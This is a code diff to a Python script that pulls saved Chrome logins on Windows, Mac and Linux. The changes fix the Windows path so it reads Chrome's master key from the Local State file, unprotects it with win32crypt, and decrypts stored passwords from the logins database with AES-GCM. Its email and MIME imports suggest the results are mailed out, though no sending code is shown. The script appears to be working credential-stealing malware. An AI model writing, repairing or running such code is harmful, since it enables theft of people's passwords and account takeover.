@@ -22,10 +22,8 @@ from email import encoders
 from email.utils import formataddr
 from email.mime.application import MIMEApplication
 from os.path import basename
-
-#
 from Cryptodome.Cipher import AES
-
+import base64,win32crypt
 
 class ChromeMac:
     def __init__(self):
@@ -69,15 +67,13 @@ class ChromeWin:
         #                "\\Chrome\\User Data\\Default\\")
 
     def get_master_key():
-        
+
         with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
             local_state = f.read()
             local_state = json.loads(local_state)
-    
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-        
         return master_key
 
     def decrypt_payload(cipher, payload):
@@ -85,20 +81,27 @@ class ChromeWin:
 
     def generate_cipher(aes_key, iv):
         return AES.new(aes_key, AES.MODE_GCM, iv)
+
+    
     
     def decrypt_func(self,buff):
-        
+        master_key = ChromeWin.get_master_key()
         try:
             iv = buff[3:15]
             payload = buff[15:]
-            cipher = generate_cipher(get_master_key, iv)
-            decrypted_pass = decrypt_payload(cipher, payload)
+            cipher = ChromeWin.generate_cipher(master_key, iv)
+            decrypted_pass = ChromeWin.decrypt_payload(cipher, payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
         except Exception as e:
             return "Chrome < 80"
- 
-
+    
+   # def decrypt_func(self, enc_passwd):
+   #     
+   #     win32crypt = import_module('win32crypt')
+   #     print( "********** ",enc_passwd)
+   #     data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
+   #     return data[1].decode('utf8')
 
 class ChromeLinux:
     
@@ -152,8 +155,13 @@ class Chrome:
             SELECT action_url, username_value, password_value
             FROM logins; """)
         data = {'data': []}
-        for result in cursor.fetchall():            
+        for result in cursor.fetchall():
+            
+            #print("master_key",result[2])
+            
             _passwd = self.chrome_os.decrypt_func(result[2])
+
+            #print("_passwd",_passwd)
             passwd = ''.join(i for i in _passwd if i in string.printable)
             if result[1] or passwd:
                 _data = {}
